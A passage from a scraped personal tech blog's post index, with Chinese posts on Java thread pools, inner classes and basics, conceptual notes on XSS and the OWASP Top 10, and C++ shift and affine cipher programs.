void shutdown():关闭 Executors:工具类、线程池的工厂类，用于创建并返回不同类型的线程池 简单示例 123456789101112131415161718192021222324//测试线程池public class TestPool &#123; //1.创建服务，创建线程池 //newFixedThreadPool 参数为：线程池大小 ExecutorService service = Executors.newFixedThreadPool(10); //执行 service.execute(new MyThread()); service.execute(new MyThread()); service.execute(new MyThread()); service.execute(new MyThread()); //关闭连接 service.shutdown();&#125;class Mythread implements Runnable &#123; @Override public void run() &#123; for (int i = 0; i &lt; 100; i++) &#123; System.out.println(Thread.currentThread().getName() + i); &#125; &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"http://xiaohublog.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"白帽子讲Web安全笔记1","slug":"白帽子讲Web安全笔记1","date":"2021-01-25T14:30:01.000Z","updated":"2021-02-24T09:28:12.791Z","comments":true,"path":"2021/01/25/白帽子讲Web安全笔记1/","link":"","permalink":"http://xiaohublog.cn/2021/01/25/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B01/","excerpt":"","text":"1、 白帽子兵法原则： 白名单，黑名单。优先使用白名单，会大大提高系统的安全性。 最小权限原则。最小权限原则要求只授予主体必要的全限，而不要过度授权 纵深防御原则。 1、要在各个不同层面，不同方面实施安全方案，避免出现疏漏，类似于“木桶理论” 2、要在正确的地方做正确的事情，即：在解决根本问题的地方实施针对性的安全方案 2、 浏览器安全2、1 同源策略这一策略极为重要，如果没有同源策略，可能a.com的一段JS脚本，在b.com未曾加载此脚本时，也可以随意修改b.com的页面。 影响“源”的因素有： host 子域名 端口 协议 2、2 浏览器沙箱Sandbox即沙箱，已经成为泛指“资源隔离类模块”的代名词。Sandbox设计目的一般是为了让不可信代码运行再一定的环境中，限制不可信任的代码访问隔离区之外的资源。 3、跨站脚本攻击（XSS）跨站脚本攻击，英文全称为Cross Site Script，在安全领域叫做”XSS“。XSS攻击，通常是指黑客通过”HTML注入“篡改了网页，插入了恶意的脚本，从而再用户浏览网页时，控制用户浏览器的一种攻击。 一、反射型XSS反射型XSS只是简单地把用户输入的数据”反射“给浏览器，也就是说，黑客需要诱使用户”点击“一个恶意链接，才能攻击成功，也叫做非持久型XSS。 二、存储型XSS存储型XSS会把用户输入的数据存储再服务器端。这这XSS具有很强的稳定性，也叫持久性XSS。 三、DOM Based XSS通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。 （注：DOM（Document Object Model）为文档对象模型），是HTML和XML文档的编程接口。）DOM可以被认为是一种通过将页面元素以对象的树形方式表现，以便由Javascript组织处理的实现方法。 目前主要的XSS漏洞防御策略及发展趋势如下： 特征匹配 这种防御策略主要是通过检测输入数据中的关键字，例如“JavaScript”，一般的网页脚本执行的都是JavaScript代码。但是这种方式比较僵硬，有些正常的含有对应关键字的数据也会被截取。 规范代码标准这种防御策略主要从web网页编码规范的角度出发，由于不同开发者开发的网页存在部分编码差异，可能存在潜在的漏洞。通过制定一套业内标准，优化web应用，此举能减少相关漏洞的产生。 使用端层防御策略这种策略主要从浏览器的角度出发，通过收集XSS信息数据库、由用户决定是否执行服务器返回的信息内容等方式进行防范。","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://xiaohublog.cn/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"多线程","slug":"多线程","permalink":"http://xiaohublog.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"OWASP TOP10介绍","slug":"OWASP Top10","date":"2021-01-18T10:10:01.000Z","updated":"2021-02-24T09:28:12.783Z","comments":true,"path":"2021/01/18/OWASP Top10/","link":"","permalink":"http://xiaohublog.cn/2021/01/18/OWASP%20Top10/","excerpt":"","text":"OWASP Top 10介绍OWASP Top（开放式Web应用程序安全项目）的工具、文档、论坛和全球各地分会都是开放的，对所有致力于改进应用程序安全的人士开放，其最具有权威的就是”10项最严重的Web应用程序安全风险列表“，总结了Web应用程序最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。 A1 注入injection将不安全的命令作为命令发送给解析器，会产生类似于SQL注入、NoSQL注入、OS注入和LDAP注入（轻量目录访问协议）的缺失，攻击者可以构造恶意数据通过注入缺陷的解析器执行没有权限的非预期命令或访问数据。 A2失效的身份认证通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者暂时或永久冒充其他用户的身份。 A3敏感信息泄露这个比较号理解，一般我们的敏感信息包括密码、财务数据、医疗数据等，由于Web应用或者API未加密或不正确的保护敏感数据，这些数据极易容易遭到攻击者的利用，攻击者可能使用这些数据来进行一些犯罪行为。因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，Web应用应该在传输过程中数据、存储的数据以及和浏览器交互时的数据进行加密，保证数据安全。 A4外部实体（XXE）XXE全称为XML External Entity attack即XML（可扩展标记语言）外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URL（统一资源标识符）文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。 A5失效的访问控制通过身份认证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能数据，比如访问用户的账户、敏感文件、获取和正常用户相同的权限等。 A6安全配置错误安全配置错误是比较常见的漏洞，由于操作者的不当配置（默认配置、临时配置、开源云存储、Http标头配置、以及包含敏感信息的相信错误），导致攻击者可以利用这些配置获得更高的权限，安全配置错误可以发生在各个层面，包括平台、web服务器、应用服务器、数据库、架构和代码等。 A7跨站脚本（XSS）XSS攻击全称为跨站脚本攻击，当应用程序的新网页中包含不受信任的、未经恰当验证、转义的数据或可以使用HTML、JavaScript的浏览器API更新现有网页时，就会出现XSS漏洞。跨站脚本攻击是很普遍的web应用安全漏洞，甚至再某些安全平台都存在XSS漏洞。XSS会指向攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用XSS还可以执行拒绝服务攻击。 A8不安全的反序列化不安全的反序列化可以导致远程代码执行、重放攻击、注入攻击或特权升级攻击。 A9使用含有已知漏洞的组件组件（库、框架或其他软件模块）拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。 A10不足的日志记录和监控这个和等保有一定的关系。不足的日志记录和监控，以及时间响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWASP","slug":"OWASP","permalink":"http://xiaohublog.cn/tags/OWASP/"},{"name":"漏洞","slug":"漏洞","permalink":"http://xiaohublog.cn/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"详谈JAVA内部类","slug":"详谈java内部类","date":"2021-01-12T14:59:01.000Z","updated":"2021-02-24T09:22:14.848Z","comments":true,"path":"2021/01/12/详谈java内部类/","link":"","permalink":"http://xiaohublog.cn/2021/01/12/%E8%AF%A6%E8%B0%88java%E5%86%85%E9%83%A8%E7%B1%BB/","excerpt":"","text":"详谈Java内部类什么是内部类？ 可以将一个类的定义放在另一个类的内部，这就是内部类。广义上我们将内部类分为四种：成员内部类，静态内部类，局部（方法）内部类，匿名内部类。 为什么要使用内部类？ 使用内部类最重要的原因是：每个类都能独立地继承一个接口的实现，所以无论外围类是否已经继承了某个接口的实现，对内部类都没有影响。 （注：内部类可以嵌套内部类，但是这极大的破坏了代码的结构，这里不推荐使用。） 1234567891011/** 1. Outer类继承了ClassA，实现了IFunctionA*/public class Outer extends ClassA implements IFunctionA&#123; /** * Inner类继承了ClassB，实现了IFunctionB */ public class Inner extends ClassB implements IfunctionB&#123; // &#125; &#125; 内部类除了上面之外还有以下优点： 内部类可以用多个实例，每个实例都有自己的状态，并且与其他外围对象的信息相互独立。 内部类就是一个独立的实体。 内部类实现了更好的封装，除了该外围类，其他类不能访问。 创建内部类对象并不依赖于外围类对象的创建。 （一）成员内部类1、外部类和内部类的定义 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162** * 外部类、成员内部类的定义 */public class Outer &#123; private int outerVariable = 1; private int commonVariable = 2; private static int outerStaticVariable = 3; //省略getter/setter /** * 成员方法 */ public void outerMethod() &#123; System.out.println(&quot;我是外部类的outerMethod方法&quot;); &#125; /** * 静态方法 */ public static void outerStaticMethod() &#123; System.out.println(&quot;我是外部类的outerStaticMethod静态方法&quot;); &#125; /** * 内部类 */ public class Inner &#123; private int commonVariable = 20; /** * 构造方法 */ public Inner() &#123; &#125; /** * 成员方法，访问外部类信息（属性、方法） */ public void innerShow() &#123; //当和外部类冲突时，直接引用属性名，是内部类的成员属性 System.out.println(&quot;内部的commonVariable:&quot; + commonVariable); //内部类访问外部属性 System.out.println(&quot;outerVariable:&quot; + outerVariable); //当和外部类属性名重叠时，可通过外部类名.this.属性名 System.out.println(&quot;外部的commonVariable:&quot; + Outer.this.commonVariable); System.out.println(&quot;outerStaticVariable:&quot; + outerStaticVariable); //访问外部类的方法 outerMethod(); outerStaticMethod(); &#125; &#125; /** * 外部类访问内部类信息 */ public void outerShow() &#123; Inner inner = new Inner(); inner.innerShow(); &#125;&#125; 2、主方法使用成员内部类 12345678910111213141516171819/** 其他类使用成员内部类 */public class Other &#123; public static void main(String[] args) &#123; //外部类对象 Outer outer = new Outer(); //创造内部类对象 Outer.Inner inner = outer.new Inner(); inner.innerShow(); /* * 可在Outer中定义get方法，获得Inner对象,那么使用时，只需outer.getInnerInstance()即可。 * public Inner getInnerInstance(Inner类的构造方法参数)&#123; * return new Inner(参数); * &#125; */ &#125;&#125; 3、小结 可以使用任何的访问修饰符 内部类的内部不能有静态信息 内部类可以进行继承，重写等操作 外部类必须使用new之后打点访问内部类 内部类可以直接使用外部类的任何信息，如果属性或者方法发生冲突，调用外部类.this.属性或者方法。 其他类访问内部类实例： 1234Outer outer=new Outer();//创造内部类对象Outer.Inner inner=outer.new Inner();inner.inner_show(); （二）静态内部类1、外部类和内部类的定义 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * 外部类、内部类定义 */public class Outer &#123; private int outerVariable = 1; /** * 外部类定义的属性(重名) */ private int commonVariable = 2; private static int outerStaticVariable = 3; static &#123; System.out.println(&quot;Outer的静态块被执行了……&quot;); &#125; /** * 成员方法 */ public void outerMothod() &#123; System.out.println(&quot;我是外部类的outerMethod方法&quot;); &#125; /* * 静态方法 */ public static void outerStaticMethod() &#123; System.out.println(&quot;我是外部类的outerStaticMethod静态方法&quot;); &#125; /** * 静态内部类 */ public static class Inner &#123; /** * 成员信息 */ private int innerVariable = 10; private int commonVariable = 20; static &#123; System.out.println(&quot;Outer.Inner的静态块执行了……&quot;); &#125; private static int innerStaticVariable = 30; /** * 成员方法 */ public void innerShow() &#123; System.out.println(&quot;innerVariable:&quot; + innerVariable); System.out.println(&quot;内部的commonVariable:&quot; + commonVariable); System.out.println(&quot;outerStaticVariable:&quot;+outerStaticVariable); outerStaticMethod(); &#125; /** * 静态方法 */ public static void innerStaticShow() &#123; //被调用时会先加载Outer类 outerStaticMethod(); System.out.println(&quot;outerStaticVariable&quot;+outerStaticVariable); &#125; &#125; /** * 外部类的内部如何和内部类打交道 */ public static void callInner() &#123; System.out.println(Inner.innerStaticVariable); Inner.innerStaticShow(); &#125;&#125; 2、其他类使用静态内部类： 12345678910public class Other &#123; public static void main(String[] args) &#123; //访问静态内部类的静态方法，Inner类被加载,此时外部类未被加载，独立存在，不依赖于外围类。 Outer.Inner.innerStaticShow(); //访问静态内部类的成员方法 Outer.Inner oi = new Outer.Inner(); oi.innerShow(); &#125;&#125; 3、小结（注意区分与成员内部类的区别） 内部可以包含任意的信息。 静态内部类的方法只能访问外部类的static关联的信息。 利用 外部类.内部类 引用=new 外部类.内部类(); 然后利用引用.成员信息(属性、方法)调用。 访问内部类的静态信息，直接外部类.内部类.静态信息就可以了。 静态内部类可以独立存在，不依赖于其他外围类。 （三）局部内部类1、外部类和内部类的定义 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * 外部类、内部类 */public class Outer &#123; /** * 属性和方法 */ private int outerVariable = 1; /** * 外部类定义的属性 */ private int commonVariable = 2; /** * 静态的信息 */ private static int outerStaticVariable = 3; /** * 成员外部方法 */ public void outerMethod() &#123; System.out.println(&quot;我是外部类的outerMethod方法&quot;); &#125; /** * 静态外部方法 */ public static void outerStaticMethod() &#123; System.out.println(&quot;我是外部类的outerStaticMethod静态方法&quot;); &#125; /** * 程序的入口 */ public static void main(String[] args) &#123; Outer outer = new Outer(); outer.outerCreatMethod(100); &#125; /** * 成员方法，内部定义局部内部类 */ public void outerCreatMethod(int value) &#123; /** * 女性 */ boolean sex = false; /** * 局部内部类，类前不能有访问修饰符 */ class Inner &#123; private int innerVariable = 10; private int commonVariable = 20; /** * 局部内部类方法 */ public void innerShow() &#123; System.out.println(&quot;innerVariable:&quot; + innerVariable); //局部变量 System.out.println(&quot;是否男性:&quot; + sex); System.out.println(&quot;参数value:&quot; + value); //调用外部类的信息 System.out.println(&quot;outerVariable:&quot; + outerVariable); System.out.println(&quot;内部的commonVariable:&quot; + commonVariable); System.out.println(&quot;外部的commonVariable:&quot; + Outer.this.commonVariable); System.out.println(&quot;outerStaticVariable:&quot; + outerStaticVariable); outerMethod(); outerStaticMethod(); &#125; &#125; //局部内部类只能在方法内使用 Inner inner = new Inner(); inner.innerShow(); &#125;&#125; 2、小结 类前不能有访问修饰符 仅在此方法内使用 无法创建静态信息 可以直接访问方法内的局部变量和参数 可以随意访问外部类的任何信息 （四）匿名内部类1、定义接口 1234//接口中方法默认为publicpublic interface IAnimal &#123; void speak();&#125; 2、匿名内部类使用 12345678910111213141516171819/*** 外部内、内部类*/public class Outer &#123; public static IAnimal getInnerInstance(String speak)&#123; return new IAnimal()&#123; @Override public void speak()&#123; System.out.println(speak); &#125;&#125;; //注意上一行的分号必须有 &#125; public static void main(String[] args)&#123; //调用的speak()是重写后的speak方法。 Outer.getInnerInstance(&quot;小狗汪汪汪！&quot;).speak(); &#125;&#125; 官方文档中的例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class HelloWorldAnonymousClasses &#123; /** * 包含两个方法的HelloWorld接口 */ interface HelloWorld &#123; public void greet(); public void greetSomeone(String someone); &#125; public void sayHello() &#123; // 1、局部类EnglishGreeting实现了HelloWorld接口 class EnglishGreeting implements HelloWorld &#123; String name = &quot;world&quot;; public void greet() &#123; greetSomeone(&quot;world&quot;); &#125; public void greetSomeone(String someone) &#123; name = someone; System.out.println(&quot;Hello &quot; + name); &#125; &#125; HelloWorld englishGreeting = new EnglishGreeting(); // 2、匿名类实现HelloWorld接口 HelloWorld frenchGreeting = new HelloWorld() &#123; String name = &quot;tout le monde&quot;; public void greet() &#123; greetSomeone(&quot;tout le monde&quot;); &#125; public void greetSomeone(String someone) &#123; name = someone; System.out.println(&quot;Salut &quot; + name); &#125; &#125;; // 3、匿名类实现HelloWorld接口 HelloWorld spanishGreeting = new HelloWorld() &#123; String name = &quot;mundo&quot;; public void greet() &#123; greetSomeone(&quot;mundo&quot;); &#125; public void greetSomeone(String someone) &#123; name = someone; System.out.println(&quot;Hola, &quot; + name); &#125; &#125;; englishGreeting.greet(); frenchGreeting.greetSomeone(&quot;Fred&quot;); spanishGreeting.greet(); &#125; public static void main(String... args) &#123; HelloWorldAnonymousClasses myApp = new HelloWorldAnonymousClasses(); myApp.sayHello(); &#125;&#125; 3、小结（匿名内部类常常被用来重写某个或某些方法） 匿名内部类是没有访问修饰符的。 没有类的名称，必须借助于接口或者父类 使用匿名内部类时，这个new之后的类首先是要存在的，其次要重写new后的类的某个或某些方法。 匿名内部类访问方法参数时也有和局部内部类同样的限制。 匿名内部类没有构造方法。","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"内部类","slug":"内部类","permalink":"http://xiaohublog.cn/tags/%E5%86%85%E9%83%A8%E7%B1%BB/"}]},{"title":"JAVA基础知识回顾","slug":"基础语法部分","date":"2021-01-02T08:56:01.000Z","updated":"2021-02-24T09:19:37.307Z","comments":true,"path":"2021/01/02/基础语法部分/","link":"","permalink":"http://xiaohublog.cn/2021/01/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E9%83%A8%E5%88%86/","excerpt":"","text":"基础语法 for循环是针对for循环的简化，从而提高编码效率 1234int [] array = &#123;1, 2, 3, 4, 5&#125;;for (int anInt : array) &#123; System.out.println(anInt);&#125; 稀疏数组的创建以及还原，稀疏数组的格式为一个有效数个数+1行，三列的二维数组。第一行是原数组的行数，列数以及有效数的个数，其他行为有效数所在的行列和有效数的值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.ping.array;public class arrayDemo1 &#123; public static void main(String[] args) &#123; int[][] array1 = new int[12][12]; array1[1][1] = 1; array1[2][2] = 2; array1[3][3] = 3; System.out.println(&quot;输出原始数组：&quot;); for (int[] ints : array1) &#123; for (int anInt : ints) &#123; System.out.print(anInt + &quot;\\t&quot;); &#125; System.out.println(); &#125; int sum = 0; for (int i = 0; i &lt; 12; i++) &#123; for (int j = 0; j &lt; 12; j++) &#123; if (array1[i][j] != 0) &#123; sum++; &#125; &#125; &#125; System.out.println(&quot;有效值的个数为：&quot; + sum); System.out.println(array1.length); //创建稀疏数组 int[][] array2 = new int[sum+1][3]; array2[0][0] = 12; array2[0][1] = 12; array2[0][2] = sum; int count = 0; for (int i = 0; i &lt; array1.length; i++) &#123; for (int j = 0; j &lt; array1[i].length; j++) &#123; if (array1[i][j] != 0) &#123; count++; array2[count][0] = i; array2[count][1] = j; array2[count][2] = array1[i][j]; &#125; &#125; &#125; for (int[] ints : array2) &#123; for (int anInt : ints) &#123; System.out.print(anInt + &quot;\\t&quot;); &#125; System.out.println(); &#125; //根据稀疏矩阵还原矩阵 int[][] array3 = new int[array2[0][0]][array2[0][1]]; for (int i = 1; i &lt; array2.length; i++) &#123; array3[array2[i][0]][array2[i][1]] = array2[i][2]; &#125; for (int[] ints : array3) &#123; for (int anInt : ints) &#123; System.out.print(anInt + &quot;\\t&quot;); &#125; System.out.println(); &#125; &#125;&#125; 静态方法和非静态方法。静态方法和类一起加载，而非静态方法则在实例化后才被加载。所以静态方法可以直接使用类名进行调用，而非静态方法则首先需要讲类进行实例化，才能调用非静态方法。 形参和实参。形参和实参的类型要一一对应。 值传递和引用传递。值传递是在调用函数时传递实参的副本，而引用传递直接传入内存地址。 使用new进行类的实例化，必须要有构造器。 （1）没有返回值 （2）和类名相同 又分为无参构造器和有参构造器，默认使用的是无参构造器。一旦定义了有参构造器，就必须显示的定义无惨构造器（方法的重载）。注：IDEA使用ALT+INSERT可以一键生成构造器。 面向对象三大特性 (1) 封装：高内聚，低耦合。将属性设置为private，并使用set和get对属性进行设置和取出操作。提高了程序和数据的安全性。 (2) 继承：JAVA只有单继承，没有多继承。使用extends关键字进行继承，注：CTRL+H查看继承树 在JAVA中，所有的类都直接或间接的继承Object类，私有的属性和方法不能被构造。 父类的引用可以指向子类，如下所示： 12345public class A &#123; public static void test() &#123; System.out.println(&quot;A-&gt;test&quot;); &#125;&#125; 12345public class B extends A &#123; public static void test() &#123; System.out.println(&quot;B-&gt;test&quot;); &#125;&#125; 12345678910public class Application &#123; public static void main(String[] args) &#123; B b = new B(); b.test(); //父类引用指向子类 A a = new B(); a.test(); &#125;&#125; 在以上例子中，由于静态方法和类一起被加载，所以无法对静态方法进行重写。如果为非静态方法且子类B对父类的test()方法进行重写，两者的输出结果都为”B-&gt;test”。 重写需要注意以下几点： 方法名必须相同 参数列表必须相同 修饰符的范围可以扩大但是不能缩小 抛出的异常范围可以缩小，但是不能扩大 Super：用于在子类中调用父类的属性和方法，super()调用父类构造器必须要在子类构造器的第一行。super和this不能同时调用构造方法。 super的作用主要在下面三种情况下： 1、调用父类被子类重写的方法； 2、调用父类被子类重定义的字段（被隐藏的成员变量）； 3、调用父类的构造方法 简单使用实例： 12345678910111213141516171819202122232425262728public class A &#123; private String nameA=&quot;A&quot;; public void getName() &#123; System.out.println(&quot;父类&quot;+nameA); &#125; public static void main(String[] args) &#123; &#125; &#125; public class B extends A&#123; private String nameB=&quot;B&quot;; @Override public void getName() &#123; System.out.println(&quot;子类&quot;+nameB); super.getName(); &#125; public static void main(String[] args) &#123; B b=new B(); b.getName(); &#125;&#125; 在子类B中，我们重写了父类的getName方法，如果在重写的getName方法中我们去调用了父类的相同方法，必须要通过super关键字显示的指明出来。 (3)多态 多态是方法的多态，属性没有多态 存在条件为继承关系，方法需要重写，父类引用指向子类 无法被重写的：static,final,private instanceof和类型转换 instanceof用于判断是否存在继承关系 把子类转换为父类，向上转换 把父类转换为子类，强制转换 方便方法的调用，减少重复的代码 静态代码块-&gt;匿名代码块-&gt;构造函数 抽象类只能单继承，但是可以用接口实现多继承 接口：只有规范，自己无法写方法，实现约束和实现分离：面向接口编程。 使用interface定义接口，默认是Public，abstract方法 使用implements实现接口 异常 throws是用来声明一个方法可能抛出的所有异常信息,throws是将异常声明但是不处理,而是将异常往上传,谁调用我就交给谁处理。而throw则是指抛出的一个具体的异常类型。","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"基础语法","slug":"基础语法","permalink":"http://xiaohublog.cn/tags/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"}]},{"title":"移位变换和仿射变换","slug":"移位变换和仿射变换","date":"2019-09-22T01:20:30.000Z","updated":"2021-11-28T15:01:28.734Z","comments":true,"path":"2019/09/22/移位变换和仿射变换/","link":"","permalink":"http://xiaohublog.cn/2019/09/22/%E7%A7%BB%E4%BD%8D%E5%8F%98%E6%8D%A2%E5%92%8C%E4%BB%BF%E5%B0%84%E5%8F%98%E6%8D%A2/","excerpt":"","text":"移位变换 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;iostream&gt;#define MAX 100using namespace std;void Encry(char * S, int K, int model)&#123; if(model == 1) &#123; for(int i = 0; i&lt;strlen(S); i++) &#123; if(S[i] &gt;= &#x27;a&#x27; &amp;&amp; S[i] &lt;= &#x27;z&#x27;) &#123; S[i] = (S[i] - &#x27;a&#x27; + K) % 26 + &#x27;a&#x27;; &#125; else if(S[i] &gt;= &#x27;A&#x27; &amp;&amp; S[i] &lt;= &#x27;Z&#x27;) &#123; S[i] = (S[i] - &#x27;A&#x27; + K) %26 + &#x27;A&#x27;; &#125; &#125; cout&lt;&lt;&quot;加密后的密文为:\\n&quot;&lt;&lt;S&lt;&lt;endl; &#125;&#125;void Decry(char * S, int K, int model)&#123; if(model == 2) &#123; for(int i = 0; i&lt;strlen(S); i++) &#123; if(S[i] &gt;= &#x27;a&#x27; &amp;&amp; S[i] &lt;= &#x27;z&#x27;) &#123; S[i] = (S[i] - &#x27;a&#x27; - K + 26) % 26 + &#x27;a&#x27;; &#125; else if(S[i] &gt;= &#x27;A&#x27; &amp;&amp; S[i] &lt;= &#x27;Z&#x27;) &#123; S[i] = (S[i] - &#x27;A&#x27; - K + 26) %26 + &#x27;A&#x27;; &#125; &#125; cout&lt;&lt;&quot;加密后的密文为:\\n&quot;&lt;&lt;S&lt;&lt;endl; &#125;&#125;int main()&#123; char S[MAX]; int k; int model; cout&lt;&lt;&quot;请选择模式:\\n&quot;; cout&lt;&lt;&quot;1.加密\\n&quot;; cout&lt;&lt;&quot;2.解密\\n&quot;; cout&lt;&lt;&quot;3.退出\\n&quot;; cin&gt;&gt;model; switch(model) &#123; case 1: cout&lt;&lt;&quot;请输入需要加密的明文：&quot;&lt;&lt;endl; cin&gt;&gt;S; cout&lt;&lt;&quot;请输入偏移量：&quot;&lt;&lt;endl; cin&gt;&gt;k; Encry(S,k,model); break; case 2: cout&lt;&lt;&quot;请输入需要解密的密文：&quot;&lt;&lt;endl; cin&gt;&gt;S; cout&lt;&lt;&quot;请输入偏移量：&quot;&lt;&lt;endl; cin&gt;&gt;k; Decry(S,k,model); break; case 3: return 0; default: break; &#125; &#125; 仿射变换 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165#include&lt;stdio.h&gt;#include&lt;iostream&gt;#include&lt;string.h&gt;#define N 26 #define MAX 100using namespace std;FILE *fp;int gcd (int a, int n)&#123; int p = a, q = n; int x = 0, y = 1; int z = q/p; while (p != 1 &amp;&amp; q!=1) &#123; int t = p; p = q % p; q = t; t = y; y = x - y * z; x = t; z = q/p; &#125; y %= n; if (y &lt; 0) y+=n; return y;&#125;void Encry (char * str, int a, int b, int model)&#123; fp = fopen (&quot;text1Encry.txt&quot;, &quot;w&quot;); if(model == 1 || model == 3) &#123; for (int i = 0; i &lt; strlen(str); i++) &#123; if (str[i] &gt;= &#x27;A&#x27; &amp;&amp; str[i] &lt;=&#x27;Z&#x27;) &#123; str[i] = ((a*(str[i]-&#x27;A&#x27;)+b) % N) + &#x27;A&#x27;; fputc (str[i], fp); &#125; else if (str[i] &gt;= &#x27;a&#x27; &amp;&amp; str[i] &lt;= &#x27;z&#x27;) &#123; str[i] = ((a*(str[i]-&#x27;a&#x27;)+b) % N) + &#x27;a&#x27;; fputc (str[i], fp); &#125; else &#123; fputc (str[i], fp); continue; &#125; &#125; cout&lt;&lt;&quot;加密后的密文为:\\n&quot;&lt;&lt;str&lt;&lt;endl; &#125; &#125;void Decry (char * str, int a, int b, int model)&#123; fp = fopen (&quot;text2Decry.txt&quot;, &quot;w&quot;); int _a; _a = gcd (a , N); cout&lt;&lt;_a&lt;&lt;endl; if(model == 2 || model == 4) &#123; for (int i = 0; i &lt; strlen(str); i++) &#123; if (str[i] &gt;= &#x27;A&#x27; &amp;&amp; str[i] &lt;=&#x27;Z&#x27;) &#123; str[i] = ((_a*(str[i]-&#x27;A&#x27; - b + N)) % N) + &#x27;A&#x27;; fputc (str[i], fp); &#125; else if (str[i] &gt;= &#x27;a&#x27; &amp;&amp; str[i] &lt;= &#x27;z&#x27;) &#123; str[i] = ((_a*(str[i]-&#x27;a&#x27;- b + N)) % N) + &#x27;a&#x27;; fputc (str[i], fp); &#125; else &#123; fputc (str[i], fp); continue; &#125; &#125; &#125; cout&lt;&lt;&quot;解密后的明文为：\\n&quot;&lt;&lt;str&lt;&lt;endl; &#125;int main ()&#123; char str[MAX]; int a, b, model; cout&lt;&lt;&quot;请选择模式：&quot;&lt;&lt;endl; cout&lt;&lt;&quot;1.加密：&quot;&lt;&lt;endl; cout&lt;&lt;&quot;2.解密：&quot;&lt;&lt;endl; cout&lt;&lt;&quot;3.文件加密：&quot;&lt;&lt;endl; cout&lt;&lt;&quot;4.文件解密：&quot;&lt;&lt;endl; cout&lt;&lt;&quot;5.退出：&quot;&lt;&lt;endl; cin&gt;&gt;model; switch (model) &#123; case 1: cout&lt;&lt;&quot;请输入需要加密的密文：&quot;&lt;&lt;endl; cin&gt;&gt;str; cout&lt;&lt;&quot;请输入a&quot;&lt;&lt;endl; cin&gt;&gt;a; cout&lt;&lt;&quot;请输入b&quot;&lt;&lt;endl; cin&gt;&gt;b; Encry (str, a, b, model); break; case 2: cout&lt;&lt;&quot;请输入需要解密的明文：&quot;&lt;&lt;endl; cin&gt;&gt;str; cout&lt;&lt;&quot;请输入a&quot;&lt;&lt;endl; cin&gt;&gt;a; cout&lt;&lt;&quot;请输入b&quot;&lt;&lt;endl; cin&gt;&gt;b; Decry (str, a, b, model); break; case 3: fp = fopen(&quot;text1.txt&quot;, &quot;r&quot;); if(fp) &#123; int i = 0; int ch = 0; while (!feof(fp)) &#123; ch = fgetc(fp); if (ch == EOF) break; str[i] = ch; i++; &#125; &#125; cout&lt;&lt;&quot;请输入a&quot;&lt;&lt;endl; cin&gt;&gt;a; cout&lt;&lt;&quot;请输入b&quot;&lt;&lt;endl; cin&gt;&gt;b; Encry (str, a, b, model); break; case 4: fp = fopen(&quot;text2.txt&quot;, &quot;r&quot;); if(fp) &#123; int i = 0; int ch = 0; while (!feof(fp)) &#123; ch = fgetc(fp); if (ch == EOF) break; str[i] = ch; i++; &#125; &#125; cout&lt;&lt;&quot;请输入a&quot;&lt;&lt;endl; cin&gt;&gt;a; cout&lt;&lt;&quot;请输入b&quot;&lt;&lt;endl; cin&gt;&gt;b; Decry (str, a, b, model); break; case 5: return 0; default: break; 